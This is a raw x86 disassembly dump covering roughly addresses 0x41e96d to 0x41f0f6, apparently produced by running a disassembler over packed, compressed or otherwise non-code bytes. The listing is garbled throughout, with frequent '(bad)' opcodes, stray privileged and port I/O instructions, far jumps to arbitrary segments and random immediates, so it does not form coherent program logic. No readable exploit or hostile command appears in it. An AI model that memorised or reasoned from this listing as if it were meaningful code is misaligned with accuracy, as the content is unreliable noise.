  41e96d:	bound  eax,QWORD PTR [esi-0x77]
  41e970:	push   ds
  41e971:	adc    dl,BYTE PTR [eax+0x7c82446]
  41e977:	fisttp DWORD PTR [edx-0x6e]
  41e97a:	jl     0x41e9a0
  41e97c:	(bad)  
  41e97d:	sbb    BYTE PTR [ebx+0x588470e4],0x8
  41e984:	popa   
  41e985:	dec    esp
  41e986:	or     BYTE PTR [ebp+eiz*4-0xb],ch
  41e98a:	test   al,0x4f
  41e98c:	cmp    esi,0x257ea261
  41e992:	pop    edx
  41e993:	call   0x6532:0x82e27ec0
  41e99a:	mov    bh,0xc0
  41e99c:	(bad)
  41e9a0:	inc    esi
  41e9a1:	push   edx
  41e9a2:	lahf   
  41e9a3:	push   0x89d22f54
  41e9a8:	call   0x73bf:0x2bfd55e4
  41e9af:	push   ebp
  41e9b0:	lods   eax,DWORD PTR ds:[esi]
  41e9b1:	pop    ss
  41e9b2:	sahf   
  41e9b3:	rcr    DWORD PTR [edi-0x117a7365],0xe8
  41e9ba:	aas    
  41e9bb:	sub    DWORD PTR [eax],0x19
  41e9be:	pop    ebp
  41e9bf:	shl    DWORD PTR [ebx],0x58
  41e9c2:	test   al,0xd3
  41e9c4:	mov    edi,DWORD PTR [ebx+ebp*1+0x1c]
  41e9c8:	dec    ebx
  41e9c9:	dec    cx
  41e9cb:	ret    0x8a15
  41e9ce:	xchg   esp,eax
  41e9cf:	adc    al,BYTE PTR [esi+0x221e07b3]
  41e9d5:	xchg   ecx,eax
  41e9d6:	aad    0x24
  41e9d8:	cmc    
  41e9d9:	ja     0x41e96f
  41e9db:	imul   esp,DWORD PTR [esi-0x3b0ba59],0x622fd89a
  41e9e5:	adc    DWORD PTR [edx+0x32deaf35],ecx
  41e9eb:	cdq    
  41e9ec:	imul   BYTE PTR ds:0x6eab773e
  41e9f2:	dec    eax
  41e9f3:	addr16 mov ah,0x24
  41e9f6:	jg     0x41ea00
  41e9f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e9f9:	outs   dx,DWORD PTR ds:[esi]
  41e9fa:	push   ebx
  41e9fb:	xlat   BYTE PTR ds:[ebx]
  41e9fc:	sub    DWORD PTR [eax+edx*4-0x4],ebp
  41ea00:	frstor [ecx]
  41ea02:	shl    BYTE PTR [ebx+edx*1+0x14301ccb],1
  41ea09:	xchg   edx,eax
  41ea0a:	es cdq 
  41ea0c:	call   0x325c806
  41ea11:	mov    eax,ds:0x8eff79d1
  41ea16:	inc    esp
  41ea17:	ss rcl ebp,cl
  41ea1a:	fild   WORD PTR [ecx]
  41ea1d:	xchg   ecx,eax
  41ea1e:	xor    al,0x8d
  41ea20:	push   esp
  41ea21:	stos   DWORD PTR es:[edi],eax
  41ea22:	jmp    0x41ea86
  41ea24:	pop    esi
  41ea25:	jmp    0xebdac40c
  41ea2a:	mov    ds:0x29ea719e,al
  41ea2f:	in     eax,dx
  41ea30:	(bad)  
  41ea32:	cli    
  41ea33:	push   0x1123f4cb
  41ea38:	push   edi
  41ea39:	mov    al,0xe4
  41ea3b:	jmp    0x46f8bd3d
  41ea40:	jb     0x41ea3e
  41ea42:	push   eax
  41ea43:	ficom  WORD PTR [ebx+0x213714d1]
  41ea49:	shl    BYTE PTR [ebx-0x351bf8b9],cl
  41ea4f:	test   al,0xd6
  41ea51:	mov    ebp,0x2646a7e6
  41ea56:	int3   
  41ea57:	jmp    0x8b67:0x7f7dfcb7
  41ea5e:	ror    BYTE PTR [esi+eax*8],1
  41ea61:	dec    esi
  41ea62:	ins    DWORD PTR es:[edi],dx
  41ea63:	mov    esp,0xf05839f5
  41ea68:	jmp    0x41ea1c
  41ea6a:	je     0x41eab0
  41ea6c:	popf   
  41ea6d:	cmp    al,BYTE PTR [edi-0x70]
  41ea70:	sub    BYTE PTR [edx-0x204b617e],bh
  41ea76:	sub    DWORD PTR [esi],ecx
  41ea78:	dec    edx
  41ea79:	idiv   ecx
  41ea7b:	dec    edi
  41ea7c:	(bad)  
  41ea7d:	or     eax,0x8e6dacaa
  41ea82:	xchg   ecx,eax
  41ea83:	sub    eax,0xfad19da0
  41ea88:	jbe    0x41eac4
  41ea8a:	fs pop ss
  41ea8c:	sbb    al,0x5d
  41ea8e:	pop    es
  41ea8f:	fadd   QWORD PTR [edi-0x70dc5771]
  41ea95:	out    0xab,eax
  41ea97:	sbb    DWORD PTR [ebx-0xf],eax
  41ea9a:	rcl    esp,0xd3
  41ea9d:	test   ch,ah
  41ea9f:	in     al,0x6a
  41eaa1:	pop    ds
  41eaa2:	inc    edi
  41eaa3:	mov    esi,DWORD PTR [edi]
  41eaa5:	std    
  41eaa6:	lods   eax,DWORD PTR ds:[esi]
  41eaa7:	bound  ebp,QWORD PTR [ecx+0x1faa311b]
  41eaad:	mov    dl,0x3a
  41eaaf:	cmp    al,0x90
  41eab1:	loopne 0x41ea9a
  41eab3:	dec    ebx
  41eab4:	sbb    BYTE PTR [ebp+0x3143a854],0xe0
  41eabb:	in     eax,dx
  41eabc:	daa    
  41eabd:	xor    eax,0xca228dee
  41eac2:	sar    BYTE PTR [ebp-0x40995184],1
  41eac8:	iret   
  41eac9:	cmp    ebp,DWORD PTR [eax+0x5]
  41eacc:	pop    ebp
  41eacd:	jbe    0x41eb3d
  41eacf:	std    
  41ead0:	(bad)  
  41ead1:	in     eax,dx
  41ead2:	iret   
  41ead3:	jnp    0x41eac9
  41ead5:	push   cs
  41ead6:	out    dx,eax
  41ead7:	hlt    
  41ead8:	xchg   ebx,eax
  41ead9:	xchg   edi,eax
  41eada:	xchg   esi,eax
  41eadb:	shr    DWORD PTR [esi],1
  41eadd:	shl    DWORD PTR gs:[eax-0x5cfd2e49],1
  41eae4:	fcomp  DWORD PTR [esi]
  41eae6:	jmp    0x41eb16
  41eae8:	adc    bl,dl
  41eaea:	outs   dx,BYTE PTR ds:[esi]
  41eaeb:	mov    ah,0x1f
  41eaed:	clc    
  41eaee:	aam    0xa2
  41eaf0:	mov    bl,0xc1
  41eaf2:	jmp    0x41eb39
  41eaf4:	aam    0x43
  41eaf6:	mov    cl,0xf3
  41eaf8:	pop    ecx
  41eaf9:	push   edx
  41eafa:	mov    WORD PTR [ecx-0x6f628d87],es
  41eb00:	xchg   ebx,eax
  41eb01:	mov    ss,WORD PTR [edx-0x1f]
  41eb04:	mov    ecx,0xe63896ac
  41eb09:	cmp    eax,0x8cc56e27
  41eb0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eb0f:	sub    al,0x13
  41eb11:	lock (bad) 
  41eb13:	(bad)  [eax+0x4]
  41eb16:	xlat   BYTE PTR ds:[ebx]
  41eb17:	cs sub ah,dl
  41eb1a:	mov    bh,0x15
  41eb1c:	jae    0x41eaa2
  41eb1e:	ds jmp 0x69a865ff
  41eb24:	fnstenv [edi+0x7a]
  41eb27:	mov    DWORD PTR [ebp+ebp*8+0xc],ebx
  41eb2b:	sbb    al,BYTE PTR [ecx-0xc]
  41eb2e:	aam    0x51
  41eb30:	cwde   
  41eb31:	(bad)  
  41eb32:	push   ss
  41eb33:	cs repnz inc ebp
  41eb36:	push   ebp
  41eb37:	lds    ebp,FWORD PTR [ebx-0x22]
  41eb3a:	mov    ebx,0xba452ee7
  41eb3f:	xlat   BYTE PTR ds:[ebx]
  41eb40:	aas    
  41eb41:	test   eax,0x41bbd8b2
  41eb46:	vpaddsb ymm6,ymm2,YMMWORD PTR [edi]
  41eb4a:	fwait
  41eb4b:	pop    ebx
  41eb4c:	js     0x41eb7c
  41eb4e:	jns    0x41eb29
  41eb50:	pop    ds
  41eb51:	(bad)  
  41eb52:	fdivr  QWORD PTR [edx]
  41eb54:	sbb    bl,BYTE PTR [edi]
  41eb56:	ds retf 0xe32f
  41eb5a:	add    edx,DWORD PTR [eax-0x15a8baa3]
  41eb60:	inc    edi
  41eb61:	js     0x41ebad
  41eb63:	shl    BYTE PTR [ecx],1
  41eb65:	xlat   BYTE PTR ds:[ebx]
  41eb66:	mov    cl,0x5c
  41eb68:	adc    al,0xaf
  41eb6a:	xor    al,BYTE PTR [ebx-0x3e]
  41eb6d:	ds dec edi
  41eb6f:	inc    edi
  41eb70:	ror    bh,cl
  41eb72:	and    ecx,eax
  41eb74:	ret    0x9f73
  41eb77:	bound  ecx,QWORD PTR [ebx+0x47f0a5ea]
  41eb7d:	inc    ebp
  41eb7e:	mov    ebp,0x8c427776
  41eb83:	sub    eax,0x8a15b188
  41eb88:	fwait
  41eb89:	ins    DWORD PTR es:[edi],dx
  41eb8a:	xchg   ecx,eax
  41eb8b:	cmc    
  41eb8c:	xor    eax,0x6a6f8294
  41eb91:	and    esi,ecx
  41eb93:	jmp    0xd4ec:0xeb0cef79
  41eb9a:	ins    BYTE PTR es:[edi],dx
  41eb9b:	push   0xbc5adac3
  41eba0:	popf   
  41eba1:	aad    0xb9
  41eba3:	or     dh,dh
  41eba5:	repz push edi
  41eba7:	or     BYTE PTR [ecx],ch
  41eba9:	fist   WORD PTR [edi]
  41ebab:	dec    ebp
  41ebac:	call   0xd1b5:0xe14cb433
  41ebb3:	pop    ss
  41ebb4:	or     al,0x6d
  41ebb6:	das    
  41ebb7:	mov    dl,0x1b
  41ebb9:	scas   eax,DWORD PTR es:[edi]
  41ebba:	shl    DWORD PTR [esi-0x5606b295],cl
  41ebc0:	loope  0x41ebcf
  41ebc2:	push   edx
  41ebc3:	aaa    
  41ebc4:	push   ebp
  41ebc5:	cwde   
  41ebc6:	push   ss
  41ebc7:	sahf   
  41ebc8:	xor    al,0xa8
  41ebca:	dec    esi
  41ebcb:	sar    DWORD PTR [edi],cl
  41ebcd:	jne    0x41ebab
  41ebcf:	out    dx,eax
  41ebd0:	and    DWORD PTR [esi-0x177258a6],eax
  41ebd6:	sub    DWORD PTR [edi-0x118bbd7e],0x38
  41ebdd:	adc    bh,BYTE PTR [eax-0x5b]
  41ebe0:	fdiv   DWORD PTR [esi+0x25]
  41ebe3:	cld    
  41ebe4:	add    DWORD PTR ds:0x7d087dd9,0xde42ec02
  41ebee:	std    
  41ebef:	imul   esp
  41ebf1:	or     ebx,eax
  41ebf3:	popf   
  41ebf4:	pop    esp
  41ebf5:	mov    al,ds:0x55d38f22
  41ebfa:	sbb    ah,BYTE PTR ds:0xb1840941
  41ec00:	repz pusha 
  41ec02:	sub    esp,DWORD PTR [edi]
  41ec04:	popa   
  41ec05:	fcom   DWORD PTR [edi-0x24f5127d]
  41ec0b:	or     cl,ah
  41ec0d:	or     ebp,0x57
  41ec10:	lock mov ah,0x75
  41ec13:	mov    bl,ah
  41ec15:	pop    edx
  41ec16:	aaa    
  41ec17:	daa    
  41ec18:	arpl   cx,si
  41ec1a:	loopne 0x41ec57
  41ec1c:	test   eax,0x9f1ce933
  41ec21:	jp     0x41ec46
  41ec23:	jg     0x41ebfc
  41ec25:	adc    DWORD PTR [edx-0x31d7cd48],edi
  41ec2b:	clc    
  41ec2c:	adc    DWORD PTR [ebp-0x1d],0xfffffffb
  41ec30:	stos   DWORD PTR es:[edi],eax
  41ec31:	cmc    
  41ec32:	jbe    0x41ec48
  41ec34:	jb     0x41ebbd
  41ec36:	nop
  41ec37:	xchg   DWORD PTR [eax+0x5d],edi
  41ec3a:	std    
  41ec3b:	jb     0x41ec4e
  41ec3d:	xchg   ecx,eax
  41ec3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec3f:	imul   edx,ecx,0x2b
  41ec42:	(bad)  
  41ec43:	jns    0x41ecb5
  41ec45:	mov    BYTE PTR [eax+eiz*2-0x47eb1634],cl
  41ec4c:	call   0xf1d8d496
  41ec51:	lods   eax,DWORD PTR ds:[esi]
  41ec52:	adc    eax,0xffffffbf
  41ec55:	jnp    0x41ec24
  41ec57:	ret    0x769c
  41ec5a:	arpl   WORD PTR [esi],sp
  41ec5c:	jae    0x41ebef
  41ec5e:	or     DWORD PTR [esi-0x6ff1d50a],esi
  41ec64:	ds mov ss,esi
  41ec67:	mov    ecx,0xf6cd305d
  41ec6c:	jae    0x41ecd4
  41ec6e:	mov    BYTE PTR [edi+ecx*2-0x6930908],0x93
  41ec76:	push   edx
  41ec77:	test   ebp,edx
  41ec79:	jle    0x41ecc1
  41ec7b:	push   ss
  41ec7c:	xchg   edx,eax
  41ec7d:	aad    0xcb
  41ec7f:	xchg   esi,eax
  41ec80:	fbld   TBYTE PTR [esi-0x27]
  41ec83:	mov    edx,DWORD PTR ss:[ecx]
  41ec86:	ret    
  41ec87:	in     eax,dx
  41ec88:	jno    0x41ec5a
  41ec8a:	add    eax,edx
  41ec8c:	mov    ebp,DWORD PTR [esi+ebx*8+0x3]
  41ec90:	cwde   
  41ec91:	sub    DWORD PTR [edx+0x33f1e367],ebp
  41ec97:	(bad)  
  41ec98:	mov    BYTE PTR ds:0xfa635373,ch
  41ec9e:	sub    BYTE PTR [esi+esi*4],bl
  41eca1:	add    BYTE PTR ds:0x172587b0,ah
  41eca7:	push   ds
  41eca8:	pop    ds
  41eca9:	(bad)  
  41ecaa:	xchg   esi,eax
  41ecab:	nop
  41ecac:	add    DWORD PTR [ebx],0xc5cb56fb
  41ecb2:	fst    DWORD PTR [eax+eiz*2+0x16]
  41ecb6:	ins    DWORD PTR es:[edi],dx
  41ecb7:	pop    ebx
  41ecb8:	pop    eax
  41ecb9:	rcr    DWORD PTR [esi-0x7253810e],0x17
  41ecc0:	pop    ds
  41ecc1:	sub    eax,0x12f8395f
  41ecc6:	cmp    eax,0xdf46f41e
  41eccb:	fs inc ecx
  41eccd:	gs gs ret 
  41ecd0:	bound  ebp,QWORD PTR [edx-0x5853684]
  41ecd6:	xchg   ebp,eax
  41ecd7:	xlat   BYTE PTR ds:[ebx]
  41ecd8:	pushf  
  41ecd9:	call   0x6f79a12b
  41ecde:	das    
  41ecdf:	shr    BYTE PTR [ebx-0x4a],0xa2
  41ece3:	xchg   ebx,eax
  41ece4:	mov    ah,0x19
  41ece6:	sbb    BYTE PTR [esi+0x32],dl
  41ece9:	int    0xd7
  41eceb:	inc    eax
  41ecec:	adc    DWORD PTR [ebx-0x76],edi
  41ecef:	xchg   edx,eax
  41ecf0:	cmp    al,0x5e
  41ecf2:	stos   DWORD PTR es:[edi],eax
  41ecf3:	das    
  41ecf4:	out    0x62,al
  41ecf6:	and    dl,ah
  41ecf8:	xor    eax,0x6b41c569
  41ecfd:	(bad)  
  41ecfe:	cmp    eax,0x9fe8c17c
  41ed03:	lock xor DWORD PTR [edx-0x72],0x1fd2152f
  41ed0b:	xchg   esp,eax
  41ed0c:	imul   esp,DWORD PTR [edi+0x77],0x8f3dcc76
  41ed13:	dec    edx
  41ed14:	lea    edx,[ebp+0x4]
  41ed17:	nop
  41ed18:	push   es
  41ed19:	ins    DWORD PTR es:[edi],dx
  41ed1a:	out    0x46,eax
  41ed1c:	mov    bh,0x9e
  41ed1e:	enter  0xeccd,0x40
  41ed22:	gs retf 
  41ed24:	inc    eax
  41ed25:	es adc ch,dh
  41ed28:	pusha  
  41ed29:	and    esp,DWORD PTR [edi-0x2b454081]
  41ed2f:	pop    esp
  41ed30:	dec    edx
  41ed31:	das    
  41ed32:	and    BYTE PTR [ecx],dh
  41ed34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ed35:	in     eax,0x40
  41ed37:	mov    ecx,0xc42cf7ae
  41ed3c:	sub    eax,0x833ddea4
  41ed41:	das    
  41ed42:	les    esi,FWORD PTR [ecx-0x7d085b17]
  41ed48:	stos   DWORD PTR es:[edi],eax
  41ed49:	sbb    al,0x87
  41ed4b:	scas   al,BYTE PTR es:[edi]
  41ed4c:	loopne 0x41ed3f
  41ed4e:	pop    ebp
  41ed4f:	or     BYTE PTR [eax+0x12e9a71e],0x40
  41ed56:	cmp    al,0x15
  41ed58:	mov    esp,0x1f659b30
  41ed5d:	arpl   sp,sp
  41ed5f:	ja     0x41ed4e
  41ed61:	ffreep st(1)
  41ed63:	jnp    0x41eda4
  41ed65:	aaa    
  41ed66:	and    BYTE PTR [ecx+eax*1],ah
  41ed69:	pop    ss
  41ed6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ed6b:	cwde   
  41ed6c:	iret   
  41ed6d:	jne    0x41ed66
  41ed6f:	iret   
  41ed70:	mov    DWORD PTR [esp+esi*8],ebx
  41ed73:	enter  0x779f,0xdd
  41ed77:	push   DWORD PTR [ecx]
  41ed79:	lods   al,BYTE PTR ds:[esi]
  41ed7a:	sbb    eax,0x7727f31c
  41ed7f:	mov    cl,0xfd
  41ed81:	pop    edx
  41ed82:	adc    ebx,0xee53d8b5
  41ed88:	dec    esp
  41ed89:	ret    
  41ed8a:	dec    esp
  41ed8b:	repnz aad 0x1f
  41ed8e:	test   al,0x32
  41ed90:	inc    edx
  41ed91:	jmp    0x41edab
  41ed93:	fsub   DWORD PTR [ebx]
  41ed95:	cs push 0xb854c552
  41ed9b:	dec    esi
  41ed9c:	ret    
  41ed9d:	pusha  
  41ed9e:	sbb    BYTE PTR ss:[edx-0x7e],dh
  41eda2:	rcl    dh,cl
  41eda4:	lods   eax,DWORD PTR ds:[esi]
  41eda5:	push   cs
  41eda6:	push   edi
  41eda7:	push   eax
  41eda8:	inc    esp
  41eda9:	nop
  41edaa:	cmp    esp,0xd8b300e9
  41edb0:	out    dx,al
  41edb1:	aam    0xd3
  41edb3:	mov    ah,0x7
  41edb5:	cmp    al,0xc3
  41edb7:	cmovle esp,DWORD PTR ds:0xf0c4e463
  41edbe:	mov    dl,0x4b
  41edc0:	js     0x41ed81
  41edc2:	add    DWORD PTR [ebp-0x67ccc559],ebx
  41edc8:	push   edx
  41edc9:	rol    edi,0x73
  41edcc:	push   esp
  41edcd:	add    ebx,DWORD PTR [edi-0x7f]
  41edd0:	pop    esi
  41edd1:	add    eax,0x82f2c45b
  41edd6:	idiv   BYTE PTR [eax+eiz*4-0x56c7c418]
  41eddd:	cmp    al,0x40
  41eddf:	fstp   QWORD PTR [edx]
  41ede1:	fst    DWORD PTR [ebx+0x48817eb7]
  41ede7:	adc    dh,BYTE PTR [esi+edx*4-0x56]
  41edeb:	inc    DWORD PTR [esi+0x52]
  41edee:	test   eax,0x4753856f
  41edf3:	sub    DWORD PTR [edx+0x39],0x4f
  41edf7:	push   0x4
  41edf9:	mov    ecx,0xba796464
  41edfe:	mov    edi,0x5506b91f
  41ee03:	ret    
  41ee04:	fld    DWORD PTR [eax]
  41ee06:	clc    
  41ee07:	pop    ss
  41ee08:	pop    es
  41ee09:	ins    DWORD PTR es:[edi],dx
  41ee0a:	cdq    
  41ee0b:	test   eax,0x6b8a88b5
  41ee10:	psllw  mm1,QWORD PTR [edi-0x73]
  41ee14:	cmp    BYTE PTR [ecx],dl
  41ee16:	sbb    ch,al
  41ee18:	and    eax,0x4d87e37e
  41ee1d:	and    al,0x8a
  41ee1f:	mov    esi,0x73a9d94f
  41ee24:	aad    0x28
  41ee26:	call   0xcad5:0x971ad447
  41ee2d:	lds    esi,FWORD PTR [eax+0x24332711]
  41ee33:	frstor [eax+0x111336e7]
  41ee39:	test   BYTE PTR [ebx+0xe77010f],ch
  41ee3f:	call   0xdff5184b
  41ee44:	shl    dl,cl
  41ee46:	je     0x41edf1
  41ee48:	adc    eax,0xeb79fe17
  41ee4d:	cmp    al,0xf5
  41ee4f:	cmp    BYTE PTR fs:[ecx+0x1c57552f],ch
  41ee56:	cmp    ch,bl
  41ee58:	mov    eax,ds:0xa786f6dc
  41ee5d:	fisttp DWORD PTR [edx+0x168ec2c0]
  41ee63:	xlat   BYTE PTR ds:[ebx]
  41ee64:	and    al,0x7c
  41ee66:	outs   dx,DWORD PTR ds:[esi]
  41ee67:	dec    edi
  41ee68:	or     ch,BYTE PTR [edi]
  41ee6a:	xchg   edi,eax
  41ee6b:	and    ch,BYTE PTR [ebp-0x20a93447]
  41ee71:	pop    ecx
  41ee72:	jmp    0x381836d2
  41ee77:	mov    DWORD PTR [ecx-0x30],0x89ba24c
  41ee7e:	pop    esp
  41ee7f:	lock and BYTE PTR [edx],bl
  41ee82:	add    eax,0x79a12f87
  41ee87:	sub    edi,DWORD PTR [ebx+0x69c1cf5b]
  41ee8d:	stos   BYTE PTR es:[edi],al
  41ee8e:	enter  0xaff,0x95
  41ee92:	lds    eax,FWORD PTR [edx-0x1f]
  41ee95:	and    ch,BYTE PTR [edx]
  41ee97:	and    esi,DWORD PTR [edx]
  41ee99:	and    al,0x71
  41ee9b:	leave  
  41ee9c:	and    bl,BYTE PTR ds:0xfe83d856
  41eea2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eea3:	mov    esi,esp
  41eea5:	xor    eax,0xef8bbca3
  41eeaa:	pop    eax
  41eeab:	xor    edx,DWORD PTR [ebx*8-0x4b61187]
  41eeb2:	stc    
  41eeb3:	xor    esi,ebx
  41eeb5:	fldcw  WORD PTR [edx-0x7ccdea5c]
  41eebb:	popa   
  41eebc:	stos   BYTE PTR es:[edi],al
  41eebd:	arpl   WORD PTR [edx-0xeb21cc2],bx
  41eec3:	shl    DWORD PTR [edx],1
  41eec5:	pop    ecx
  41eec6:	ins    DWORD PTR es:[edi],dx
  41eec7:	inc    esi
  41eec8:	push   edi
  41eec9:	mov    bl,0x12
  41eecb:	push   ebp
  41eecc:	loope  0x41ee7f
  41eece:	in     al,dx
  41eecf:	adc    eax,0xce7c38af
  41eed4:	lahf   
  41eed5:	push   gs
  41eed7:	jbe    0x41ef3a
  41eed9:	pop    edx
  41eeda:	sbb    DWORD PTR [ecx],edi
  41eedc:	pushf  
  41eedd:	jmp    FWORD PTR [eax+0x5afd1dbf]
  41eee3:	mov    al,ds:0x4fc363f5
  41eee8:	and    DWORD PTR [esi],ecx
  41eeea:	mov    ds:0x196ab2ea,eax
  41eeef:	mov    esi,0x56818b76
  41eef4:	rol    BYTE PTR [ebx+esi*2+0x1309cf82],0x64
  41eefc:	retf   0x8a62
  41eeff:	push   eax
  41ef00:	jecxz  0x41ee87
  41ef02:	inc    esp
  41ef03:	(bad)  
  41ef04:	and    DWORD PTR [ebx+ebp*2],ecx
  41ef07:	add    BYTE PTR es:[ebx-0x748c201c],0xf7
  41ef0f:	lea    ecx,es:[ebx]
  41ef12:	adc    DWORD PTR [eax],0x6e
  41ef15:	test   al,al
  41ef17:	retf   
  41ef18:	push   esi
  41ef19:	xor    DWORD PTR [esi+0x48b2511],0x44f2f412
  41ef23:	rcl    DWORD PTR [ebx],0xf8
  41ef26:	adc    cl,cl
  41ef28:	push   ebx
  41ef29:	dec    eax
  41ef2a:	lods   eax,DWORD PTR ds:[esi]
  41ef2b:	dec    edi
  41ef2c:	sbb    al,0x5e
  41ef2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef2f:	fbld   TBYTE PTR [ebx-0x3a5d17d3]
  41ef35:	pop    edx
  41ef36:	cmp    al,0xec
  41ef38:	push   esi
  41ef39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef3a:	add    eax,0x7ee81623
  41ef3f:	dec    esi
  41ef40:	das    
  41ef41:	mov    BYTE PTR [esi],ch
  41ef43:	xor    ebx,ecx
  41ef45:	push   0xe988a181
  41ef4a:	mov    dh,0x9c
  41ef4c:	arpl   WORD PTR [ebx],sp
  41ef4e:	mov    ecx,0x4de66ead
  41ef53:	lahf   
  41ef54:	das    
  41ef55:	add    ebx,DWORD PTR [ebx+0x7cb65a0e]
  41ef5b:	scas   al,BYTE PTR es:[edi]
  41ef5c:	mov    ds:0x4bc82062,al
  41ef61:	iret   
  41ef62:	(bad)  [ecx]
  41ef64:	fnstcw WORD PTR [edi]
  41ef66:	stos   BYTE PTR es:[edi],al
  41ef67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef68:	pop    edi
  41ef69:	loope  0x41ef1f
  41ef6b:	loope  0x41ef32
  41ef6d:	ins    DWORD PTR es:[edi],dx
  41ef6e:	retf   
  41ef6f:	mov    al,0x1e
  41ef71:	scas   eax,DWORD PTR es:[edi]
  41ef72:	jmp    0x41efbc
  41ef74:	adc    al,0x57
  41ef76:	aam    0x5a
  41ef78:	(bad)  
  41ef7a:	data16 out dx,al
  41ef7c:	jg     0x41ef9f
  41ef7e:	mov    ebx,0xc4b43b4e
  41ef83:	jecxz  0x41eff9
  41ef85:	pop    edx
  41ef86:	test   eax,0x5aaea532
  41ef8b:	imul   edx,edx,0xbd56c808
  41ef91:	mov    ecx,0x8653ca0
  41ef96:	cld    
  41ef97:	in     al,dx
  41ef98:	adc    eax,esi
  41ef9a:	test   eax,0x3c1d5408
  41ef9f:	std    
  41efa0:	mov    eax,ebp
  41efa2:	sbb    BYTE PTR [ebp-0x2f968655],dl
  41efa8:	sar    BYTE PTR [ecx],0xfc
  41efab:	add    BYTE PTR [edx-0x199daa81],ch
  41efb1:	add    ch,BYTE PTR [ebx]
  41efb3:	out    dx,eax
  41efb4:	mov    DWORD PTR [edi],edx
  41efb6:	inc    BYTE PTR [esi*4+0x66d231f8]
  41efbd:	iret   
  41efbe:	push   ebp
  41efbf:	sbb    DWORD PTR [edx],edx
  41efc1:	xor    BYTE PTR [ebp-0x7e],ah
  41efc4:	fs xchg edi,eax
  41efc6:	aas    
  41efc7:	mov    bl,0xfa
  41efc9:	jmp    0x23cf:0xbb09e414
  41efd0:	dec    esp
  41efd1:	call   0x29eee308
  41efd6:	inc    esp
  41efd7:	stos   DWORD PTR es:[edi],eax
  41efd8:	les    esp,FWORD PTR [ecx+ecx*2+0x680b0429]
  41efdf:	sbb    ebp,DWORD PTR [ecx-0x27]
  41efe2:	aad    0xb3
  41efe4:	loope  0x41f01f
  41efe6:	jl     0x41efec
  41efe8:	hlt    
  41efe9:	call   DWORD PTR [edi-0x2eb12817]
  41efef:	cmp    DWORD PTR [eax+0x7c6ec848],esi
  41eff5:	ret    
  41eff6:	scas   al,BYTE PTR es:[edi]
  41eff7:	adc    dh,ch
  41eff9:	jl     0x41ef85
  41effb:	or     eax,0xb8aeb0a1
  41f000:	(bad)  
  41f001:	ds (bad) 
  41f003:	sub    ecx,esi
  41f005:	lock out dx,eax
  41f007:	mov    esi,0x84a8fef4
  41f00c:	data16 fiadd DWORD PTR [ebp+edi*2+0x22]
  41f011:	add    DWORD PTR [esi+0x5d],0xffffffcc
  41f015:	adc    eax,0xf47f832f
  41f01a:	dec    ebp
  41f01b:	inc    edi
  41f01c:	clc    
  41f01d:	fnstcw WORD PTR [ebx-0x5376da9c]
  41f023:	sub    eax,0x71356014
  41f028:	pushf  
  41f029:	outs   dx,DWORD PTR ds:[esi]
  41f02a:	push   ss
  41f02b:	sub    al,0x97
  41f02d:	(bad)  
  41f02e:	mov    ecx,0xdfd9d9fd
  41f033:	push   0xffffffa3
  41f035:	adc    BYTE PTR [esi-0x25ab5ed1],dl
  41f03b:	ja     0x41f076
  41f03d:	pushf  
  41f03e:	dec    esi
  41f03f:	or     cl,bh
  41f041:	jge    0x41f053
  41f043:	mov    WORD PTR [ecx+ebx*4],fs
  41f046:	(bad)  
  41f047:	cld    
  41f048:	adc    BYTE PTR [esi+0x20],ah
  41f04b:	mov    ds:0x38741d07,al
  41f050:	fsubr  QWORD PTR [eax]
  41f052:	jae    0x41f0c5
  41f054:	cmp    ecx,0xc613907
  41f05a:	sti    
  41f05b:	and    eax,0x53615fcc
  41f060:	ret    0x151f
  41f063:	je     0x41f0a6
  41f065:	sbb    al,0xa4
  41f067:	sub    al,0x5b
  41f069:	inc    esp
  41f06a:	outs   dx,DWORD PTR ds:[esi]
  41f06b:	and    al,0xee
  41f06d:	and    ch,BYTE PTR [esi+0x594d1a3e]
  41f073:	lods   al,BYTE PTR ds:[esi]
  41f074:	mov    eax,0xf49f6252
  41f079:	mov    eax,0x89dbdf25
  41f07e:	and    eax,DWORD PTR [ebp+0x9]
  41f081:	or     DWORD PTR ds:0xd12e3bb1,eax
  41f087:	(bad)  
  41f088:	xchg   ebx,eax
  41f089:	inc    ebp
  41f08a:	lods   al,BYTE PTR ds:[esi]
  41f08b:	gs mov eax,0x7959bdfb
  41f091:	cmp    ah,BYTE PTR [ebp-0x2dabaf70]
  41f097:	lods   eax,DWORD PTR ds:[esi]
  41f098:	inc    esi
  41f099:	lods   eax,DWORD PTR ds:[esi]
  41f09a:	out    0x51,al
  41f09c:	sbb    esp,DWORD PTR [eax+0x21]
  41f09f:	div    BYTE PTR fs:[eax-0x22]
  41f0a3:	aam    0xb9
  41f0a5:	rcr    BYTE PTR [esi-0x61],0x96
  41f0a9:	scas   eax,DWORD PTR es:[edi]
  41f0aa:	inc    esi
  41f0ab:	fsub   DWORD PTR [edi]
  41f0ad:	sub    DWORD PTR [esi-0x5],ebx
  41f0b0:	lods   al,BYTE PTR ds:[esi]
  41f0b1:	mov    esp,0x5343d7ec
  41f0b6:	mov    al,ds:0x85de9b35
  41f0bb:	pop    ecx
  41f0bd:	popa   
  41f0be:	pop    eax
  41f0bf:	retf   
  41f0c0:	shl    DWORD PTR [edx+0x42796341],cl
  41f0c6:	mov    ecx,0x5483d93c
  41f0cb:	pop    ecx
  41f0cc:	in     eax,0xc5
  41f0ce:	and    al,0xef
  41f0d0:	in     eax,dx
  41f0d1:	cld    
  41f0d2:	fadd   QWORD PTR [edx-0x8557bb4]
  41f0d8:	pop    edi
  41f0d9:	aaa    
  41f0da:	mov    al,0xf8
  41f0dc:	cdq    
  41f0dd:	loope  0x41f106
  41f0df:	cmp    DWORD PTR [eax+0x33],edx
  41f0e2:	imul   ebx,DWORD PTR [edi],0x58dc81b0
  41f0e8:	dec    eax
  41f0e9:	or     eax,0x5ba58dd1
  41f0ee:	daa    
  41f0ef:	adc    DWORD PTR [eax-0x38d5d499],ebx
  41f0f5:	aaa    
  41f0f6:	jl     0x41f113
